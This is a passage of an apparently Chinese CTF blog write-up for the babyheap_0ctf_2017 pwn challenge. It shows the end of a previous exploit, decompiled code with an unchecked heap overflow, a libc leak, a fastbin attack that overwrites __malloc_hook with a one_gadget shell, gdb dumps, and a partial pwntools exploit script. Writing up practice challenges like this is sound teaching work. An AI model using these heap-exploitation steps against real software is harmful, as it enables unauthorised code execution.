(libc.symbols[<span class="string">&#x27;free&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    log.info(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br><span class="line"> </span><br><span class="line">    update_desc(<span class="number">1</span>, <span class="number">0x4</span>, p32(system_addr))</span><br><span class="line">    <span class="comment">#desc-&gt;[free]&lt;-system</span></span><br><span class="line">    delete_user(<span class="number">2</span>)</span><br><span class="line"> 	<span class="comment">#free(*desc)--&gt;system(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="babyheap_0ctf_2017"><a class="markdownIt-Anchor" href="#babyheap_0ctf_2017"></a> babyheap_0ctf_2017</h2>
<h3 id="1checksec-10"><a class="markdownIt-Anchor" href="#1checksec-10"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/joe1sn/Documents/ctf/questions/BUUCTF/pwn/babyheap_0ctf_2017/babyheap_0ctf_2017&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h3 id="2ida-10"><a class="markdownIt-Anchor" href="#2ida-10"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    input();                                    <span class="comment">// input</span></span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="type">unsigned</span> __int64)off_14F4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">        Allocate(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">        Fill(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">        Free(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">        Dump(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5uLL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Fill</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Fill</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = input();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="type">signed</span> <span class="type">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">signed</span> <span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      result = input();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        result = sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>没有检查堆是否溢出</p>
</blockquote>
<p><strong>Free</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Free</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = input();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="type">signed</span> <span class="type">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">signed</span> <span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(<span class="number">24LL</span> * v2 + a1) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>));</span><br><span class="line">      result = <span class="number">24LL</span> * v2 + a1;</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>没有system,leak libc + malloc_hook(无法修改GOT表)</p>
</blockquote>
<p><strong>one_gadget</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
<p><strong>main_arena_offset</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+]libc version : glibc 2.23</span><br><span class="line">[+]build ID : BuildID[sha1]=1ca54a6e0d76188105b12e49fe6b8019bf08803a</span><br><span class="line">[+]main_arena_offset : 0x3c4b20</span><br></pre></td></tr></table></figure>
<h3 id="3gdb-2"><a class="markdownIt-Anchor" href="#3gdb-2"></a> 3.GDB</h3>
<h4 id="31-libc-leak"><a class="markdownIt-Anchor" href="#31-libc-leak"></a> 3.1 libc leak</h4>
<blockquote>
<p>一般采取堆块重叠后，free()加入unsorted bin最后dump出unsorted bin的地址，根据libc中与main_arena的偏移得到libc_base</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code:</span></span><br><span class="line">Allocate(<span class="number">0x60</span>)</span><br><span class="line">Allocate(<span class="number">0x30</span>)</span><br><span class="line">Fill(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)) &lt;--修改idx=<span class="number">1</span>的chunks size</span><br><span class="line">Allocate(<span class="number">0x100</span>)		<span class="comment">#idx=2		  &lt;--堆重叠了</span></span><br><span class="line">Fill(<span class="number">2</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)) &lt;--idx=<span class="number">2</span>的BK_nextsize位修改</span><br><span class="line">Free(<span class="number">1</span>)							  &lt;--加入fastbin链表（free()的还是<span class="number">0x30</span>大小）</span><br><span class="line">Allocate(<span class="number">0x60</span>)<span class="comment">#idx=1			  &lt;--堆溢出</span></span><br><span class="line">Fill(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>))&lt;--堆修复</span><br><span class="line">Allocate(<span class="number">0x60</span>)<span class="comment">#idx=3			  &lt;--和top_chunk分隔</span></span><br><span class="line">Free(<span class="number">2</span>)</span><br><span class="line">GDB()</span><br><span class="line">leak = u64(Dump(<span class="number">1</span>)[-<span class="number">25</span>:-<span class="number">17</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak:&quot;</span>+<span class="built_in">hex</span>(leak)</span><br><span class="line"></span><br><span class="line">base=leak-<span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook=base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=0x55754fefb010, size=0x70, flags=PREV_INUSE)</span><br><span class="line">    [0x000055754fefb010     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]</span><br><span class="line">Chunk(addr=0x55754fefb080, size=0x70, flags=PREV_INUSE)</span><br><span class="line">    [0x000055754fefb080     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]</span><br><span class="line">Chunk(addr=0x55754fefb0f0, size=0x70, flags=PREV_INUSE)</span><br><span class="line">    [0x000055754fefb0f0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">───────────── Unsorted Bin for arena &#x27;main_arena&#x27; ─────────────</span><br><span class="line">[+] unsorted_bins[0]: fw=0x55754fefb0b0, bk=0x55754fefb0b0</span><br><span class="line"> →   Chunk(addr=0x55754fefb0c0, size=0x110, flags=PREV_INUSE)</span><br><span class="line">[+] Found 1 chunks in unsorted bin.</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/45gx 0x55de8a864000</span><br><span class="line">0x55de8a864000: 0x0000000000000000      0x0000000000000071</span><br><span class="line">0x55de8a864010: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x55de8a864020: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x55de8a864030: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x55de8a864040: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x55de8a864050: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x55de8a864060: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x55de8a864070: 0x0000000000000000      0x0000000000000071</span><br><span class="line">0x55de8a864080: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x55de8a864090: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x55de8a8640a0: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x55de8a8640b0: 0x0000000000000000      0x0000000000000111</span><br><span class="line">0x55de8a8640c0: 0x00007fa305c4ab78      0x00007fa305c4ab78  &lt;---unsorted bin</span><br><span class="line">0x55de8a8640d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55de8a8640e0: 0x0000000000000000      0x0000000000000071</span><br><span class="line">0x55de8a8640f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55de8a864100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55de8a864110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55de8a864120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55de8a864130: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55de8a864140: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55de8a864150: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="32-fastbin-attack"><a class="markdownIt-Anchor" href="#32-fastbin-attack"></a> 3.2 fastbin attack</h4>
<blockquote>
<p>最后再修改malloc_hook-35的地址（mallco_hook的参数要偏移，且偏移后的地址不能为0）为exec_binsh(one_gadget)</p>
<p>简言之就是hook-&gt;onegadget</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code:</span></span><br><span class="line">Free(<span class="number">1</span>)</span><br><span class="line">Fill(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">35</span>)+p64(<span class="number">0</span>))</span><br><span class="line">GDB()</span><br><span class="line"><span class="comment">#堆溢出覆盖chunk1的fd,使得下一块chunk在malloc_hook-35的地方</span></span><br><span class="line">Allocate(<span class="number">0x60</span>)</span><br><span class="line">GDB()</span><br></pre></td></tr></table></figure>
<h4 id="34-覆盖chunk1的fd"><a class="markdownIt-Anchor" href="#34-覆盖chunk1的fd"></a> 3.4 覆盖chunk1的fd</h4>
<p><strong>heap</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">0x55a4b068b000 FASTBIN &#123;  &lt;---chunk 0</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 113, </span><br><span class="line">  fd = 0x6161616161616161, </span><br><span class="line">  bk = 0x6161616161616161, </span><br><span class="line">  fd_nextsize = 0x6161616161616161, </span><br><span class="line">  bk_nextsize = 0x6161616161616161</span><br><span class="line">&#125;</span><br><span class="line">0x55a4b068b070 FASTBIN &#123;   &lt;---chunk1</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 113, </span><br><span class="line">  fd = 0x7f038a23caed &lt;_IO_wide_data_0+301&gt;, </span><br><span class="line">  		malloc_hook-35</span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x6161616161616161, </span><br><span class="line">  bk_nextsize = 0x6161616161616161</span><br><span class="line">&#125;</span><br><span class="line">0x55a4b068b0e0 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 113, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x55a4b068b150 &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 0, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>bins</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x7ff5da1deaed (_IO_wide_data_0+301) ◂— 0xf5d9e9fe20000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p><strong>stack</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x7ff5da1deb10-35 </span><br><span class="line">0x7ff5da1deaed &lt;_IO_wide_data_0+301&gt;:   0xf5da1dd260000000 </span><br><span class="line">0x7ff5da1deaf5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f </span><br><span class="line">0x7ff5da1deafd: 0xf5d9e9fe20000000 </span><br><span class="line">0x7ff5da1deb05 &lt;__memalign_hook+5&gt;:     0xf5d9e9fa0000007f </span><br><span class="line">0x7ff5da1deb0d &lt;__realloc_hook+5&gt;:      0x000000000000007f </span><br><span class="line">0x7ff5da1deb15 &lt;__malloc_hook+5&gt;:       0x0000000000000000 </span><br><span class="line">0x7ff5da1deb1d: 0x0000000000000000 </span><br><span class="line">0x7ff5da1deb25 &lt;main_arena+5&gt;:  0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="35-填入onegadget"><a class="markdownIt-Anchor" href="#35-填入onegadget"></a> 3.5 填入onegadget</h4>
<p><strong>heap</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0x55efd712d000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 113, </span><br><span class="line">  fd = 0x6161616161616161, </span><br><span class="line">  bk = 0x6161616161616161, </span><br><span class="line">  fd_nextsize = 0x6161616161616161, </span><br><span class="line">  bk_nextsize = 0x6161616161616161</span><br><span class="line">&#125;</span><br><span class="line">0x55efd712d070 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 113, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x55efd712d0e0 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 113, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x55efd712d150 &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 0, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>gdb</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x7f0f7c16ab10-35</span><br><span class="line">0x7f0f7c16aaed &lt;_IO_wide_data_0+301&gt;:   0x0f7c169260000000 </span><br><span class="line">0x7f0f7c16aaf5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f</span><br><span class="line">0x7f0f7c16aafd: 0x4141414141414141</span><br><span class="line">0x7f0f7c16ab05 &lt;__memalign_hook+5&gt;:     0x4141414141414141</span><br><span class="line">0x7f0f7c16ab0d &lt;__realloc_hook+5&gt;:      0x0f7bdeb26a414141</span><br><span class="line">0x7f0f7c16ab15 &lt;__malloc_hook+5&gt;:       0x000000000000007f</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7f0f7bda6000+0x4526a=0x7f0f7bdeb26a</span><br><span class="line">		=0x7f0f7c16ab0d &lt;__realloc_hook+5&gt;的数值</span><br></pre></td></tr></table></figure>
<h3 id="4exp-3"><a class="markdownIt-Anchor" href="#4exp-3"></a> 4.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,26611)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./babyheap_0ctf_2017&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Allocate</span>(<span class="params">size</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fill</span>(<span class="params">idx,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Free</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dump</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span 